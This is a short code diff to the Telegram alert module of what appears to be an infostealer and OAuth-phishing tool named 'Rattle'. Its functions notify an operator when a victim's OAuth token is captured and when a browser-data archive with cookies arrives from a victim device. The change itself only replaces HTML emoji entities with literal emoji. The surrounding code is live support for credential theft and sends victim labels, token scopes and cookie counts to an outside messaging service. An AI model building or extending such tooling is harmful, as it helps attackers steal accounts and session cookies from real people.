@@ -38,8 +38,10 @@ def send_telegram(bot_token: str, chat_id: str, message: str) -> bool:
 
 def notify_new_token(bot_token, chat_id, campaign_name, victim_label, scopes):
     """Fire a Telegram alert when a new OAuth token is captured."""
+    # Real emoji characters (UTF-8) - Telegram's HTML parse mode does not
+    # reliably decode numeric entities like &#127919;.
     msg = (
-        "&#127919; <b>Rattle capture</b>\n"
+        "🎯 <b>Rattle capture</b>\n"
         f"Campaign: <b>{escape(str(campaign_name))}</b>\n"
         f"Target: {escape(str(victim_label))}\n"
         f"Scopes: {escape(str(scopes))}"
@@ -52,7 +54,7 @@ def notify_new_grab(
 ):
     """Fire a Telegram alert when the server receives a browser-data archive."""
     msg = (
-        "&#128230; <b>Rattle grab received</b>\n"
+        "📦 <b>Rattle grab received</b>\n"
         f"Device: <b>{escape(str(device_label))}</b>\n"
         f"Browsers: {escape(str(browsers or 'unknown'))}\n"
         f"Cookies: {cookie_count}\n"
